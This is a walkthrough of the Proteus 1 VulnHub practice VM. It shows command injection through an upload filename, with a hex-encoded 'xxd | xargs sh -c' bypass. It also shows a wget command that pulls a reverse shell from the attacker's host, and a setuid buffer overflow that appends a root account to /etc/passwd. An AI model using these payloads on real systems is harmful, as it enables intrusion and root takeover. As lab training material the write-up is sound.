# Proteus 1 Vulnhub Walkthrough

## Intro

Below you will find a walkthrough of the Proteus 1 VM. This was a fun and challenging machine. This page is full of fun spoilers, so if you're 
still attemping to root the machine, try harder :). Without further ado, let's dive in. 

## Download and Find It

Download the Proteus VM from (VulnHub)[https://www.vulnhub.com/entry/proteus-1,193/], load it up, and pick your favorite tool. For quick identification,
 I use nmap.
 
`nmap 192.168.2.0/24 -sP
Starting Nmap 7.70 ( https://nmap.org )
Nmap scan report for Proteus (192.168.2.180)
Host is up (0.23s latency).
`

## Start Enumeration

I use a series of scripts to gather most of the information for me. Reconscan by Mike Czumak does an nmap script and starts work on additional modules
depending on what ports are determined to be open. There are three main ports open: 22, 80, and 5355

<INSERT CODE/IMAGE HERE>

Nikto and Dirb scans are kicked off for port 80. Let's continue exploring the website.

## Proteus

Fire up Burp and head to the web page. First notes are that there is a file upload, which is always fun to play with, and a login. Some quick auth bypass tries and sqlmap bear no fruit, so I focus on the main function and upload some files. If you upload something that doesn't fit the MIME type, Proteus gets mad at you and rejects. When you get a successful upload, Proteus brings you to the /samples page. 

<IMAGE HERE>

Proteus changes our file name to a base64 encoded value, runs strings, and runs objdump on our file. That's nice of them. We can also see uder objdump our file name (stored in /home/malwareadm/samples/). 

Looking at the POST in Burp, we have name="file"; and filename="file.bin" that we can mess with. I tried messing around wtih base64 encoded filenames first, but it's always better to keep it simple. Test for command injection in the filename parameter. filename="file.bin;id" works when you reload your webpage. 

## Messing With Command Injection

This part gave me quite a bit of trouble. The site takes the parameter of filename (currently set to file.bin;id), converts it to a random string (and keeps the extension if possible), and then runs base64 on it. It is useful that we know the name of our file as we can use it to access our own payloads on the server if  need be. 

I needed to generate a 'bad characters' list as some commands would not pass through. The website makes this pretty simple and fails obviously when testing. 

Good chars <IMAGE>
Bad chars <IMAGE>

Most of the commands that would give us further access require either '/' for files or a '.' for an ip address. I could open a port with nc, but I couldn't actually connect or interact with it afterwards. Looking back at the good character list, we have access to pipe. Essentially, if we can string together a set of commands, encoded or otherwise, we can create complex commands for execution.

After much trial and error I'm left with the following: `echo <hex encoded command> | xxd -r -p | xargs -i{} sh -c '{}'`

Taking hex encoded values, I can pass it to xxd (which also handles the encoding), and finally pass it to xargs which can handle the execution by bassing to sh. It was easy passing encoded values; however, they wouldn't execute (or if they did it was blind). I also ran into an issue that the server changes the filename parameter to all lower case. Initially I messed with xargs -I, but the server didn't like it. The xargs -i[replace] functionality is apparently deprecated (check man) in favor of -I, so I'm glad I had a version (4.7.0) that still had it. 
 
## Arbitrary Command Injection

It's easy to create hex encoded commands. I also created a quick script to help double check my works and possibly handle other use cases (though be wary of my shaky script abilites). Let's check again to see everything working. Here is the payload with 'cat /etc/passwd'

<IMAGE>

Now we can try to put a reverse shell in. The current account doesn't have write access to the web directory, so I needed to put it somewhere else. wget supports this. 
`wget -O /tmp/simpleshell.py http://<IP ADDR>/simpleshell.py`
Encode it, send it, and double check the file was recieved. You can always look at your own apache access.log to see if the GET was successful, or you can 'ls' the /tmp directory. If you check the /tmp directory with permissions, you can see they were nice enough to even grant our shell execute permissions. 

<IMAGE>

So now all I have to do is throw up a listner and execute the shell.

## >_Terminal

Once inside you can explore around to your heart's content. There are some config files with credentials and a test admin login that can be used for the web page. There is even a RSA private key (password protected). Keep exploring and you'll eventually find a quaint file: admin_login_logger. Check it's permissions and notice anything special? The sticky bit is set and the owner is root. I nc it over to my machine for further testing. 

admin_login_logger takes a parameter and writes it to a log file. 
<IMG>
Nothing too special, but user input is a fickle thing. I generated a junk pattern and pass it into the logger to see interestinng effects. 
<IMG>

An overflow occurs and I actually overwrite the file location and file name. Cool. So I have the ability to write to any file as root with a certain space for a payload. A few things to note about the overflow: it starts user input with a new line, the user input is appended to the end of the file, the user has limited space for the payload, and the user has limited space in the file name for the path and file. Calculating the pattern offset is 456 based on the name of the file created when I hit the first overflow. 
 
With these notes in mind, I can craft a payload. I fire up python interpreter for some quick work. 
`def pad(len):
    pad="A"*len
    return pad
`
`def gen():
    payload=userInput + pad(patternCustomLen-len(userInput)) + fileToOverwrite
    print payload
`
I initially thought I could overwrite the /etc/passwd file and remove the root account password, but this is when I found that the overflow just appends user input to the end. It also doesn't handle new lines very well either. Another easy thing to do is add an account to the machine. I crafted a user without a password and the machine still wouldn't let me su. Then, hashed a password (I used openssl passwd), created a user, su ... and fail because the overflow overwrote the :shell: section of /etc/passwd and the machine didn't know what to give me. 
 
Finally, here is the user input section of the final payload: `<username>:<password>:0:0::/tmp/`
 
Now to su <username>, type the password, and pop to a root shell.
 
<IMG>
 
Now you can find the flag and display it. 
 
<IMG>
 
##  Final comments

Overall I had a lot of, albeit frustrating, fun. I needed the practice and learned some things along the way. The system gives a lot of leeway to the user because it executes commands in so many places and even grants them execute rights. Crafting the original injection is probably the hardest part. Now onto the next one.

